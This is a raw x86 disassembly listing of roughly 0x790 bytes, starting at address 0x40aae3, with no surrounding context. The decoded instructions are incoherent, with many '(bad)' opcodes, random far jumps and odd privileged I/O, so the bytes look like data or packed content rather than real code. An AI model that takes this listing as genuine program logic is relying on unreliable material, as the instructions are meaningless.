  40aae3:	je     0x40ab45
  40aae5:	push   0xffffff92
  40aae7:	out    0xd2,eax
  40aae9:	mov    dh,0x86
  40aaeb:	leave  
  40aaec:	pop    es
  40aaed:	test   al,0x75
  40aaf0:	and    eax,0x34dfecd
  40aaf5:	sbb    eax,0x3e3ee6db
  40aafa:	aam    0x19
  40aafc:	jo     0x40ab56
  40aafe:	adc    bh,BYTE PTR [edi-0x4cd28f30]
  40ab04:	popa   
  40ab05:	xlat   BYTE PTR ds:[ebx]
  40ab06:	div    dl
  40ab08:	fidivr WORD PTR [edx+0x47]
  40ab0b:	repz (bad) 
  40ab0d:	mov    al,0x2a
  40ab0f:	sbb    BYTE PTR [ecx-0x3e],0xda
  40ab13:	mov    ebp,0xa8e85db
  40ab18:	mov    ds:0x1a7c1c52,eax
  40ab1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab1e:	dec    ebx
  40ab1f:	aas    
  40ab20:	or     al,0xd4
  40ab22:	aas    
  40ab23:	std    
  40ab24:	enter  0xb7dc,0x1b
  40ab28:	(bad)  
  40ab29:	mov    ecx,0xf07bea35
  40ab2e:	mov    DWORD PTR [esi],ecx
  40ab30:	add    DWORD PTR [eax+eax*8+0x7a],eax
  40ab34:	dec    edx
  40ab35:	rol    al,1
  40ab37:	gs jle 0x40ab32
  40ab3a:	adc    DWORD PTR [ecx-0x53],edi
  40ab3d:	pop    edi
  40ab3e:	jne    0x40aae0
  40ab40:	cld    
  40ab41:	fs mov ah,0xf7
  40ab44:	sub    BYTE PTR [edi+0x2e4b081f],bl
  40ab4a:	sti    
  40ab4b:	or     eax,0x7aaea73d
  40ab50:	fst    DWORD PTR ds:0xbb02174f
  40ab56:	aaa    
  40ab57:	retf   0x3221
  40ab5a:	daa    
  40ab5b:	cwde   
  40ab5c:	scas   eax,DWORD PTR es:[edi]
  40ab5d:	jne    0x40abbe
  40ab5f:	aaa    
  40ab60:	fnstenv [edx+edi*8-0x22]
  40ab64:	fwait
  40ab65:	mov    edx,ds
  40ab67:	(bad)  
  40ab68:	sti    
  40ab69:	(bad)  
  40ab6a:	dec    eax
  40ab6c:	or     BYTE PTR [ebp+0x55ebb2c0],dl
  40ab72:	sti    
  40ab73:	std    
  40ab74:	push   eax
  40ab75:	add    esp,DWORD PTR [edx+0x50f3ac06]
  40ab7b:	leave  
  40ab7c:	loop   0x40ab42
  40ab7e:	daa    
  40ab7f:	xlat   BYTE PTR ds:[ebx]
  40ab80:	add    eax,0xb6b76f86
  40ab85:	mov    ebx,DWORD PTR [edi-0x47]
  40ab88:	retf   
  40ab89:	mov    bl,0x88
  40ab8b:	test   eax,0xa00d4302
  40ab90:	inc    esi
  40ab91:	call   0xb0d22e46
  40ab96:	mov    edi,0x62f8f556
  40ab9b:	and    eax,0xa8752bc6
  40aba0:	and    BYTE PTR [eax+0x2cd3fe01],0x98
  40aba7:	lods   al,BYTE PTR ds:[esi]
  40aba8:	jmp    0x7783:0xc61be0da
  40abaf:	mov    DWORD PTR [esi+0x30],0x9006c8b1
  40abb6:	mov    edx,0x544e6e66
  40abbb:	or     edx,DWORD PTR [edi-0xb]
  40abbe:	adc    esi,DWORD PTR [edx]
  40abc0:	sbb    al,BYTE PTR [ecx+0xaf287f5]
  40abc6:	cmp    edx,ecx
  40abc8:	sub    ah,al
  40abca:	pop    ds
  40abcb:	or     DWORD PTR [ecx+0x35],edi
  40abce:	fimul  DWORD PTR [ebp-0x6660a4f1]
  40abd4:	dec    esp
  40abd5:	sub    ch,ch
  40abd7:	push   cs
  40abd8:	ins    BYTE PTR es:[edi],dx
  40abd9:	adc    al,0x23
  40abdb:	xor    BYTE PTR [eax],0xd4
  40abde:	mov    al,0x3b
  40abe0:	aas    
  40abe1:	loop   0x40ac20
  40abe3:	xchg   edx,eax
  40abe4:	repz scas eax,DWORD PTR es:[edi]
  40abe6:	push   edx
  40abe7:	jl     0x40ab6b
  40abe9:	call   0x57fa15ba
  40abee:	xchg   edi,eax
  40abef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abf0:	pop    ebx
  40abf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abf2:	xchg   ebx,eax
  40abf3:	jp     0x40ac68
  40abf5:	cdq    
  40abf6:	cmp    eax,0x74fe10e8
  40abfb:	out    0x5a,eax
  40abfd:	pop    ds
  40abfe:	fisub  DWORD PTR [esi+0x4e5c8de9]
  40ac04:	(bad)
  40ac07:	or     bl,BYTE PTR [ebx+0x366780fa]
  40ac0d:	cli    
  40ac0e:	dec    ebx
  40ac0f:	pop    esp
  40ac10:	cli    
  40ac11:	inc    edx
  40ac12:	clc    
  40ac13:	inc    ebx
  40ac14:	fisubr WORD PTR [esi+0x691bbde3]
  40ac1a:	push   eax
  40ac1b:	outs   dx,BYTE PTR ds:[esi]
  40ac1c:	sti    
  40ac1d:	ja     0x40abbe
  40ac1f:	rcr    edi,cl
  40ac21:	fadd   st(3),st
  40ac23:	les    edi,FWORD PTR [ebx-0x18]
  40ac26:	sub    al,0x72
  40ac28:	push   es
  40ac29:	test   al,0x76
  40ac2b:	sub    dl,bl
  40ac2d:	stos   BYTE PTR es:[edi],al
  40ac2e:	popa   
  40ac2f:	mov    cs,eax
  40ac31:	push   es
  40ac32:	arpl   WORD PTR [eax+0x3c34b55d],si
  40ac38:	cmp    al,0xbc
  40ac3a:	or     DWORD PTR [ebp-0x61],ebp
  40ac3d:	sub    eax,0x33f1b286
  40ac42:	shr    DWORD PTR [eax-0x4e],1
  40ac45:	pop    ds
  40ac46:	ficomp WORD PTR [ebx]
  40ac48:	add    DWORD PTR [eax+0xe],esp
  40ac4b:	fld    TBYTE PTR ds:[edi+eax*4-0x1e]
  40ac50:	rcr    bh,1
  40ac52:	mov    ds,eax
  40ac54:	adc    BYTE PTR [esi-0x3f],0x4f
  40ac58:	ja     0x40acc4
  40ac5a:	cmp    ecx,DWORD PTR [eax]
  40ac5c:	adc    ebp,ebx
  40ac5e:	add    ecx,DWORD PTR [edx+eax*1]
  40ac61:	cs popa 
  40ac63:	mov    eax,ds:0xa5232ac3
  40ac68:	stos   BYTE PTR es:[edi],al
  40ac69:	jge    0x40ac38
  40ac6b:	nop
  40ac6c:	add    eax,0xfd1adc4
  40ac71:	cld    
  40ac72:	xor    al,0x19
  40ac74:	jecxz  0x40ac08
  40ac76:	into   
  40ac77:	mov    edi,DWORD PTR [ecx]
  40ac79:	fidiv  WORD PTR [esi+0x17dcd96]
  40ac7f:	mov    eax,0x8dace018
  40ac84:	aas    
  40ac85:	mov    DWORD PTR [esi],ebx
  40ac87:	sub    ah,BYTE PTR [ebx+0x72]
  40ac8a:	sub    al,0x80
  40ac8c:	jecxz  0x40acb6
  40ac8e:	sar    DWORD PTR [esi+0x4cf0d3cf],1
  40ac94:	sub    BYTE PTR [ecx+0x39],bh
  40ac97:	xor    BYTE PTR ds:0x4a404152,0xe0
  40ac9e:	loopne 0x40acf3
  40aca0:	jmp    0x40ac4c
  40aca2:	mov    bl,0x69
  40aca4:	add    eax,DWORD PTR [edx-0x24]
  40aca7:	mov    WORD PTR [edi-0x6f96499],cs
  40acad:	mov    bh,0x87
  40acaf:	in     al,0x7c
  40acb1:	lea    esi,[ecx+0x2ffd3639]
  40acb7:	mov    esi,0x200025f2
  40acbc:	lds    ebp,FWORD PTR [ebx]
  40acbe:	das    
  40acbf:	pushf  
  40acc0:	and    eax,0x5ef24ad6
  40acc5:	mov    bh,0x28
  40acc7:	repz push 0x2a
  40acca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40accb:	sar    bl,0x55
  40acce:	mov    ebp,0x1e5c8257
  40acd3:	(bad)  
  40acd4:	ja     0x40acbe
  40acd6:	iret   
  40acd7:	ins    BYTE PTR es:[edi],dx
  40acd8:	cld    
  40acd9:	mov    BYTE PTR [esi],ch
  40acdb:	push   ebx
  40acdc:	retf   0x46c
  40acdf:	daa    
  40ace0:	and    BYTE PTR fs:[edx-0x4d7f43d3],0x7e
  40ace8:	(bad)  
  40ace9:	dec    ecx
  40acea:	out    dx,al
  40aceb:	xor    DWORD PTR [esi],esp
  40aced:	push   ecx
  40acee:	adc    BYTE PTR [ebp+0x413cd888],cl
  40acf4:	daa    
  40acf5:	pop    es
  40acf6:	mov    eax,ds:0x2c4a0e0c
  40acfb:	inc    ecx
  40acfc:	add    eax,0xa4884bf
  40ad01:	xchg   esp,eax
  40ad02:	adc    BYTE PTR [eax-0x7be9b7c2],dh
  40ad08:	jle    0x40ace4
  40ad0a:	or     al,0xa4
  40ad0c:	pop    esp
  40ad0d:	and    bl,BYTE PTR [esi]
  40ad0f:	mov    eax,ds:0xd4f2c215
  40ad14:	repz rol DWORD PTR gs:[esi-0x2c],cl
  40ad19:	lea    edx,[ebp+0x55854d6b]
  40ad1f:	fmul   QWORD PTR [edi-0x46c407b8]
  40ad25:	cli    
  40ad26:	ficom  WORD PTR [edx+0x2a85a77]
  40ad2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad2d:	in     eax,dx
  40ad2e:	daa    
  40ad2f:	ss cmp al,0xf9
  40ad32:	or     al,0x92
  40ad34:	js     0x40ad24
  40ad36:	inc    esp
  40ad37:	mov    ebp,0xdba38641
  40ad3c:	jle    0x40ad87
  40ad3e:	test   eax,0xbe61032a
  40ad43:	mov    al,0x1
  40ad45:	stos   BYTE PTR es:[edi],al
  40ad46:	or     ebx,DWORD PTR ds:0x646c8930
  40ad4c:	gs cdq 
  40ad4e:	xor    BYTE PTR [ebx+0x78],dh
  40ad51:	int3   
  40ad52:	out    0xfe,eax
  40ad54:	pop    ebx
  40ad55:	sbb    cl,BYTE PTR [eax+0x77ea12b]
  40ad5b:	stos   BYTE PTR es:[edi],al
  40ad5c:	test   al,0xe5
  40ad5e:	mov    esp,DWORD PTR [edx-0x5281049]
  40ad64:	fwait
  40ad65:	loope  0x40ad37
  40ad67:	js     0x40ad41
  40ad69:	pop    DWORD PTR [ebp-0x109ce1e5]
  40ad6f:	mov    al,0x47
  40ad71:	fidiv  DWORD PTR [edx-0x47]
  40ad74:	scas   eax,DWORD PTR es:[edi]
  40ad75:	outs   dx,DWORD PTR ds:[esi]
  40ad76:	fimul  DWORD PTR [eax-0x6cc44d15]
  40ad7c:	(bad)
  40ad7f:	jnp    0x40ada0
  40ad81:	xor    ch,BYTE PTR [edx-0x4b]
  40ad84:	or     al,0x75
  40ad86:	adc    esi,ecx
  40ad88:	out    dx,eax
  40ad89:	clc    
  40ad8a:	push   eax
  40ad8b:	(bad)  
  40ad8c:	fcomp  DWORD PTR [ecx-0x76760abc]
  40ad92:	xchg   ecx,eax
  40ad93:	push   es
  40ad94:	mov    dh,0x35
  40ad96:	repnz mov DWORD PTR [ecx-0x5348b9d4],esp
  40ad9d:	pushf  
  40ad9e:	mov    dh,0x19
  40ada0:	xor    BYTE PTR [ebp-0x13],dh
  40ada3:	jo     0x40add2
  40ada5:	mov    ebp,0xf47e4178
  40adaa:	cdq    
  40adab:	mov    DWORD PTR ds:0x4543c0ce,esi
  40adb1:	dec    esi
  40adb2:	loope  0x40ad5c
  40adb4:	cmp    eax,0xf28fbe70
  40adb9:	jae    0x40ad3e
  40adbb:	sbb    DWORD PTR [ecx],ebp
  40adbd:	mov    esp,0x47f66e3c
  40adc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adc4:	pop    es
  40adc5:	ins    BYTE PTR es:[edi],dx
  40adc6:	adc    eax,0x4cb37103
  40adcb:	loopne 0x40ad88
  40adcd:	sbb    eax,eax
  40adcf:	add    DWORD PTR [ebx-0x18a27e07],ebx
  40add5:	jmp    0x40ade1
  40add7:	fadd   QWORD PTR [esi]
  40add9:	popf   
  40adda:	imul   esi,DWORD PTR [ecx-0x5d],0x70bfbd91
  40ade1:	xchg   edi,eax
  40ade2:	xor    DWORD PTR [eax],ebp
  40ade4:	int3   
  40ade5:	xchg   edx,eax
  40ade6:	add    al,0xfd
  40ade8:	jo     0x40adaf
  40adea:	ror    DWORD PTR [ebx],0x9a
  40aded:	mov    esi,0xebe19d5d
  40adf2:	xchg   ebx,ebx
  40adf4:	pop    ss
  40adf5:	cmp    bl,BYTE PTR [ebp-0x7104f524]
  40adfb:	dec    eax
  40adfc:	xor    ah,BYTE PTR [edi]
  40adfe:	jbe    0x40ad8a
  40ae00:	sub    esp,DWORD PTR [esi]
  40ae02:	sbb    esi,ebp
  40ae04:	lahf   
  40ae05:	pop    ecx
  40ae06:	jmp    0x40ae62
  40ae08:	lods   eax,DWORD PTR ds:[esi]
  40ae09:	adc    dl,BYTE PTR [ebx]
  40ae0b:	ror    cl,1
  40ae0d:	js     0x40ae0f
  40ae0f:	montmul (bad)
  40ae10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae11:	add    eax,esi
  40ae13:	mov    al,ds:0x5f388086
  40ae18:	rcr    BYTE PTR [ecx+0x2ffacc1c],1
  40ae1e:	or     edx,DWORD PTR [esi+0x7066a1e5]
  40ae24:	das    
  40ae25:	mov    cl,0xfa
  40ae27:	push   0x745a3acd
  40ae2c:	in     al,0xf7
  40ae2e:	mov    bh,0xae
  40ae30:	imul   esp,edx,0x64
  40ae33:	stos   DWORD PTR es:[edi],eax
  40ae34:	(bad)  
  40ae35:	call   DWORD PTR [esi]
  40ae37:	jle    0x40add7
  40ae39:	mov    edx,0xd6b58695
  40ae3e:	std    
  40ae3f:	inc    ebp
  40ae40:	ins    BYTE PTR es:[edi],dx
  40ae41:	in     eax,dx
  40ae42:	les    esp,FWORD PTR [esi]
  40ae44:	inc    ebp
  40ae45:	imul   ebx,ebp,0xe550100f
  40ae4b:	outs   dx,BYTE PTR ds:[esi]
  40ae4c:	jbe    0x40ae6e
  40ae4e:	cld    
  40ae4f:	xchg   esp,eax
  40ae50:	retf   0x89a7
  40ae53:	cmp    DWORD PTR [ebp-0x5dc61b56],ebx
  40ae59:	mov    DWORD PTR [ecx-0x3269ee8c],edx
  40ae5f:	data16 and al,0x9e
  40ae62:	xchg   esp,eax
  40ae63:	xlat   BYTE PTR ds:[ebx]
  40ae64:	jmp    0x415c:0x8d0d632d
  40ae6b:	mov    eax,0x5e993450
  40ae70:	and    DWORD PTR [edx-0xc64357a],esp
  40ae76:	cmp    BYTE PTR [ebp-0x3f],0x61
  40ae7a:	xor    al,0xca
  40ae7c:	pop    es
  40ae7d:	dec    esp
  40ae7e:	ror    BYTE PTR [edx-0x7d251632],0xb3
  40ae85:	adc    eax,0xefa49c2e
  40ae8a:	push   ds
  40ae8b:	retf   
  40ae8c:	xchg   BYTE PTR [ebx-0x6bbb80a8],bh
  40ae92:	cdq    
  40ae93:	add    edi,edx
  40ae95:	push   edx
  40ae96:	sbb    bh,BYTE PTR [ecx]
  40ae98:	call   0xa79bbfc2
  40ae9d:	stc    
  40ae9e:	int3   
  40ae9f:	psllw  mm6,QWORD PTR [ecx-0x5]
  40aea3:	xor    eax,0xbf212008
  40aea8:	jo     0x40ae67
  40aeaa:	daa    
  40aeab:	rol    DWORD PTR [ebp+ecx*8-0x5566ffea],cl
  40aeb2:	outs   dx,DWORD PTR ds:[esi]
  40aeb3:	jge    0x40ae3c
  40aeb5:	sub    al,0xd8
  40aeb7:	icebp  
  40aeb8:	or     esp,0x350bc4e
  40aebe:	cs ins DWORD PTR es:[edi],dx
  40aec0:	and    eax,0xf8ffd1d3
  40aec5:	mov    ebx,DWORD PTR [edx]
  40aec7:	fadd   QWORD PTR [eax]
  40aec9:	push   ebx
  40aeca:	adc    edi,DWORD PTR [eax+0x44]
  40aecd:	out    dx,eax
  40aece:	mov    edi,0x2b1d4d8b
  40aed3:	jecxz  0x40ae65
  40aed5:	pop    esp
  40aed6:	dec    esi
  40aed7:	repz neg BYTE PTR [edx+0x5098c7f]
  40aede:	xchg   eax,esp
  40aee0:	sahf   
  40aee1:	pop    ebp
  40aee2:	cld    
  40aee3:	cld    
  40aee4:	clc    
  40aee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aee6:	add    al,0x56
  40aee8:	pop    ebx
  40aee9:	jne    0x40ae90
  40aeeb:	repz push esp
  40aeed:	inc    edx
  40aeee:	loopne 0x40af17
  40aef0:	in     eax,dx
  40aef1:	out    0xff,al
  40aef3:	dec    eax
  40aef4:	or     BYTE PTR [edi],ah
  40aef6:	sbb    ecx,DWORD PTR [esi]
  40aef8:	or     DWORD PTR [ecx-0x36],0x8f3d307c
  40aeff:	iret   
  40af00:	xchg   edx,eax
  40af01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af02:	(bad)  
  40af03:	pop    ss
  40af04:	mov    edx,0x6f0946ec
  40af09:	cmp    esi,DWORD PTR [esp+edx*8-0x290d4014]
  40af10:	jp     0x40af57
  40af12:	sub    BYTE PTR [edx-0x38],cl
  40af15:	int3   
  40af16:	pop    es
  40af17:	in     eax,dx
  40af18:	mov    eax,0x16350bac
  40af1d:	pop    es
  40af1e:	test   eax,0xaef383fa
  40af23:	jne    0x40aecb
  40af25:	add    eax,0x92ae10a3
  40af2a:	push   ss
  40af2b:	push   esp
  40af2c:	or     BYTE PTR [eax],bl
  40af2e:	ja     0x40af14
  40af30:	jge    0x40af1d
  40af32:	out    dx,al
  40af33:	xchg   ebp,esp
  40af35:	sub    eax,0xd2226962
  40af3a:	sbb    eax,0xfb83fa49
  40af3f:	pop    es
  40af40:	mov    ds:0xb32f5ffb,al
  40af45:	test   al,0xf1
  40af47:	vpacksswb ymm5,ymm3,YMMWORD PTR [ecx-0x6a]
  40af4c:	lds    ebp,FWORD PTR [edi+eiz*4]
  40af4f:	test   BYTE PTR [edi+0x2],bl
  40af52:	pop    esi
  40af53:	mov    bl,0xc7
  40af55:	call   0xe174:0x643ad061
  40af5c:	(bad)  
  40af5e:	jns    0x40af03
  40af60:	mov    bl,BYTE PTR [eax-0x43cbe237]
  40af66:	js     0x40af58
  40af68:	push   esp
  40af69:	sub    bp,bp
  40af6c:	add    ebx,edx
  40af6e:	and    eax,0xdb0740c2
  40af73:	(bad)  
  40af74:	call   0x67e2:0xb0574fd3
  40af7b:	pop    ss
  40af7c:	test   al,0x16
  40af7e:	call   0xcf099f6a
  40af83:	in     eax,0x5e
  40af85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af86:	dec    ebx
  40af87:	xor    ecx,esp
  40af89:	ds xchg ecx,eax
  40af8b:	push   eax
  40af8c:	jmp    0xf0f1:0xd70b1bc3
  40af93:	mov    WORD PTR [edx-0x2338726d],fs
  40af99:	ja     0x40af2b
  40af9b:	stc    
  40af9c:	ror    BYTE PTR [edi],cl
  40af9e:	mov    al,ds:0xc946464c
  40afa3:	je     0x40af4a
  40afa5:	aam    0x6d
  40afa7:	sub    BYTE PTR [ecx],dh
  40afa9:	shr    BYTE PTR [eax+edx*8+0x58bf592f],cl
  40afb0:	out    dx,al
  40afb1:	xor    DWORD PTR [edi-0x22],ebx
  40afb4:	mov    bh,0x4e
  40afb6:	mov    bh,0xda
  40afb8:	in     eax,dx
  40afb9:	mov    ds:0x9400bafc,al
  40afbe:	fisubr WORD PTR [ecx-0x7596a147]
  40afc4:	sub    eax,0x93755fd3
  40afc9:	(bad)  
  40afca:	dec    ebx
  40afcb:	enter  0x6cf4,0x52
  40afcf:	xor    BYTE PTR [ecx],dl
  40afd1:	fstp   DWORD PTR [ebx+0x58425480]
  40afd7:	retf   0xcd41
  40afda:	mov    dh,0x75
  40afdc:	jmp    0xb2d9:0xe7a349e7
  40afe3:	aas    
  40afe4:	xor    al,0x9e
  40afe6:	dec    edx
  40afe7:	add    eax,eax
  40afe9:	pop    ebp
  40afea:	xor    eax,0x24c505f5
  40afef:	popa   
  40aff0:	or     edi,ebp
  40aff2:	jns    0x40b055
  40aff4:	push   es
  40aff5:	push   edi
  40aff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aff7:	repz aad 0x36
  40affa:	and    DWORD PTR [eax-0x34],eax
  40affd:	inc    ebx
  40affe:	jl     0x40afca
  40b000:	jmp    0xadfd:0x75677a4e
  40b007:	out    dx,eax
  40b008:	mov    eax,ds:0x995f9a5a
  40b00d:	xor    dh,BYTE PTR [eax-0x22]
  40b010:	cmpxchg DWORD PTR [ebx+0x61658ee2],ecx
  40b017:	or     DWORD PTR [ecx-0x6a],ebp
  40b01a:	data16 js 0x40afde
  40b01d:	out    0x6c,eax
  40b01f:	push   es
  40b020:	je     0x40b013
  40b022:	int    0x1c
  40b024:	mov    ds:0x79fef1bb,eax
  40b029:	cmp    eax,0x6ddf2aa4
  40b02e:	xor    eax,0x9cba8897
  40b033:	fcomp  DWORD PTR [ebp-0x67]
  40b036:	mov    ds:0x3b643beb,eax
  40b03b:	cmp    BYTE PTR [ebx-0x16],dh
  40b03e:	push   ecx
  40b03f:	(bad)  
  40b040:	es inc esp
  40b042:	shr    BYTE PTR [esi+eiz*4],1
  40b045:	jo     0x40b064
  40b047:	(bad)  
  40b048:	add    al,BYTE PTR [ebp+eax*4-0xff94d6e]
  40b04f:	jmp    DWORD PTR [esi+0x36]
  40b052:	add    DWORD PTR [eax-0x1],ebp
  40b055:	popf   
  40b056:	cmp    eax,0xce20732d
  40b05b:	stos   DWORD PTR es:[edi],eax
  40b05c:	cdq    
  40b05d:	aas    
  40b05e:	pop    ecx
  40b05f:	xor    DWORD PTR [ebx],esi
  40b061:	jmp    0x40b0ad
  40b063:	xor    BYTE PTR [eax],dh
  40b065:	push   edi
  40b066:	cwde   
  40b067:	and    al,0xc8
  40b069:	push   ss
  40b06a:	shl    DWORD PTR [edi-0x4fef173a],1
  40b070:	mov    ebp,0x22f80228
  40b075:	xor    BYTE PTR [ecx-0x43],0xbb
  40b079:	pop    esi
  40b07a:	aad    0x62
  40b07c:	ficom  DWORD PTR [ebx-0x6efd0dbf]
  40b082:	ret    
  40b083:	fs loope 0x40b063
  40b086:	pusha  
  40b087:	jo     0x40b067
  40b089:	adc    ecx,DWORD PTR [edi+0x6d]
  40b08c:	arpl   WORD PTR [ebx],si
  40b08e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40b090:	cdq    
  40b091:	sbb    eax,0x20800506
  40b096:	(bad)  
  40b097:	out    0x52,eax
  40b099:	mov    dl,0x4f
  40b09b:	mov    eax,ds:0xb002b9ca
  40b0a0:	mov    ds:0xaa2feca5,eax
  40b0a5:	push   es
  40b0a6:	mov    al,ds:0xc4ff2e88
  40b0ab:	jnp    0x40b03b
  40b0ad:	stos   DWORD PTR es:[edi],eax
  40b0ae:	and    edi,edi
  40b0b0:	xchg   esp,eax
  40b0b1:	and    BYTE PTR [edx+ebp*8-0x2d966975],bh
  40b0b8:	test   al,0x4b
  40b0ba:	jmp    0x651b:0x19e6f2aa
  40b0c1:	sbb    al,0x99
  40b0c3:	data16 in al,dx
  40b0c5:	sub    ecx,DWORD PTR [edx-0x3cd2bb46]
  40b0cb:	addr16 jbe 0x40b086
  40b0ce:	loop   0x40b0f3
  40b0d0:	sbb    BYTE PTR [ebx-0x5e],al
  40b0d3:	or     ebp,DWORD PTR [edi]
  40b0d5:	and    DWORD PTR [edx-0x4f],esp
  40b0d8:	pop    ebx
  40b0d9:	pop    ecx
  40b0da:	aad    0xb3
  40b0dc:	cmp    DWORD PTR [eax+0x5586c132],esi
  40b0e2:	je     0x40b095
  40b0e4:	adc    bl,BYTE PTR [ebx]
  40b0e6:	shl    DWORD PTR [ecx+0x3082ac7f],1
  40b0ec:	mov    bh,0xa
  40b0ee:	mov    al,0xc1
  40b0f0:	mov    esi,0xe613953f
  40b0f5:	dec    esp
  40b0f6:	cli    
  40b0f7:	mov    edi,0x5b1bad5e
  40b0fc:	dec    edi
  40b0fd:	imul   ecx,eax,0x78
  40b100:	int    0x44
  40b102:	jne    0x40b0ea
  40b104:	push   esi
  40b105:	fisub  DWORD PTR [ebp+0x6e0deb93]
  40b10b:	(bad)  
  40b10c:	adc    cl,BYTE PTR [esi]
  40b10e:	jno    0x40b13a
  40b110:	jmp    DWORD PTR [ebx+0x76]
  40b113:	(bad)  
  40b114:	adc    edx,edx
  40b116:	mov    bl,0x91
  40b118:	sub    ebx,DWORD PTR [ebx]
  40b11a:	or     esp,DWORD PTR fs:[ebx+eax*8]
  40b11e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b11f:	pop    edx
  40b120:	ret    
  40b121:	test   eax,0xed2f5ad7
  40b126:	xor    DWORD PTR [ecx],0x56aaaa9d
  40b12c:	push   0xf6a1841d
  40b131:	adc    al,0xf4
  40b133:	scas   al,BYTE PTR es:[edi]
  40b134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b135:	fnsave [ebx]
  40b137:	push   ds
  40b138:	pop    eax
  40b139:	test   BYTE PTR [eax-0x4abb1431],bh
  40b13f:	mov    dl,0x8a
  40b141:	loopne 0x40b163
  40b143:	mov    bh,0x58
  40b145:	jns    0x40b1b0
  40b147:	push   esi
  40b148:	xchg   esi,eax
  40b149:	mov    ch,0x8e
  40b14b:	in     al,dx
  40b14c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40b14e:	aaa    
  40b14f:	push   es
  40b150:	inc    edi
  40b151:	inc    eax
  40b152:	(bad)  
  40b153:	cld    
  40b154:	xor    dh,BYTE PTR [ecx+0x34]
  40b157:	sti    
  40b158:	ja     0x40b0ea
  40b15a:	lods   al,BYTE PTR ds:[esi]
  40b15b:	in     al,0x7f
  40b15d:	add    esi,DWORD PTR [esi-0x2a]
  40b160:	adc    ebx,DWORD PTR [ecx-0x62146531]
  40b166:	jge    0x40b1d2
  40b168:	ja     0x40b14e
  40b16a:	data16 fisub WORD PTR [esi]
  40b16d:	or     bh,BYTE PTR [esi+ecx*1-0x63]
  40b171:	adc    DWORD PTR [ecx],0x75dd0e3
  40b177:	and    ebp,esp
  40b179:	mov    dh,0x37
  40b17b:	jle    0x40b118
  40b17d:	das    
  40b17e:	pop    ecx
  40b17f:	dec    edx
  40b180:	add    bh,BYTE PTR [edx+0x68]
  40b183:	xchg   ebx,eax
  40b184:	daa    
  40b185:	sbb    eax,0x7851a41
  40b18a:	and    ecx,esi
  40b18c:	sbb    DWORD PTR [eax-0x37cdddaa],ebp
  40b192:	ss xor ah,ah
  40b195:	arpl   WORD PTR [ebp-0x2a0012ff],dx
  40b19b:	das    
  40b19c:	jb     0x40b1fd
  40b19e:	or     dl,cl
  40b1a0:	push   ss
  40b1a1:	xchg   edx,eax
  40b1a2:	cmp    eax,0x9dedbe7e
  40b1a7:	clc    
  40b1a8:	out    0x6a,al
  40b1aa:	pmaxsw mm6,mm5
  40b1ad:	out    0x7f,al
  40b1af:	xchg   ebx,eax
  40b1b0:	jb     0x40b1c4
  40b1b2:	push   cs
  40b1b3:	and    bh,dl
  40b1b5:	pop    ebp
  40b1b6:	push   ss
  40b1b7:	jbe    0x40b1ae
  40b1b9:	mov    edi,0x2a758d4c
  40b1be:	es mov ch,0xa0
  40b1c1:	out    0x86,eax
  40b1c3:	xor    bh,ah
  40b1c5:	pop    esi
  40b1c6:	(bad)  
  40b1c7:	fiadd  WORD PTR [edi+0x75f364d3]
  40b1cd:	add    al,0x78
  40b1cf:	mov    edx,0xee5732e3
  40b1d4:	xor    eax,0x2a4c21d9
  40b1d9:	loopne 0x40b172
  40b1db:	jns    0x40b1f9
  40b1dd:	push   eax
  40b1de:	retf   0xf93c
  40b1e1:	clc    
  40b1e2:	xor    ebp,eax
  40b1e4:	leave  
  40b1e5:	sub    eax,0x2983601b
  40b1ea:	xchg   BYTE PTR [edi+ebx*1+0x66980aa3],bl
  40b1f1:	out    0x98,al
  40b1f3:	add    BYTE PTR [ebx+ebx*4-0x5],dh
  40b1f7:	dec    esi
  40b1f8:	xchg   ebp,eax
  40b1f9:	cld    
  40b1fa:	popa   
  40b1fb:	push   ds
  40b1fc:	mov    dh,0x2a
  40b1fe:	shl    BYTE PTR [ecx+0x3f],cl
  40b201:	mov    dl,0xff
  40b203:	adc    bl,al
  40b205:	cmp    edi,DWORD PTR [edi-0x78]
  40b208:	faddp  st(4),st
  40b20a:	or     cl,BYTE PTR [edi-0x1a]
  40b20d:	stos   BYTE PTR es:[edi],al
  40b20e:	das    
  40b20f:	or     bh,BYTE PTR [edx-0x6e]
  40b212:	mov    edx,0x2f27708c
  40b217:	lea    eax,ds:0x95369a44
  40b21d:	retf   0x8f76
  40b220:	test   al,0x11
  40b222:	ins    BYTE PTR es:[edi],dx
  40b223:	into   
  40b224:	and    BYTE PTR ds:0x5e667cf,dh
  40b22a:	pushf  
  40b22b:	xor    esp,edi
  40b22d:	test   BYTE PTR [eax+0x7c479740],dl
  40b233:	xor    bl,BYTE PTR [edx]
  40b235:	test   DWORD PTR [eax],esi
  40b237:	cs sub al,0xc
  40b23a:	inc    edi
  40b23b:	pop    edx
  40b23c:	and    al,0x9
  40b23e:	test   BYTE PTR [ebp+0x341da204],dh
  40b244:	pop    eax
  40b245:	pop    ebx
  40b246:	jmp    0x40b27b
  40b248:	cs mov bl,0x17
  40b24b:	push   esi
  40b24c:	(bad)  
  40b24d:	clc    
  40b24e:	push   eax
  40b24f:	mov    bh,0x82
  40b251:	jle    0x40b240
  40b253:	cmc    
  40b254:	sbb    DWORD PTR [eax-0x602d4f4e],edi
  40b25a:	push   esi
  40b25b:	pop    ebx
  40b25c:	jmp    DWORD PTR [eax+0x695dec71]
  40b262:	fdivr  st,st(0)
  40b264:	stc    
  40b265:	sub    DWORD PTR [ecx-0x1efc5ec8],0xcd482e01
  40b26f:	stos   DWORD PTR es:[edi],eax
  40b270:	hlt    
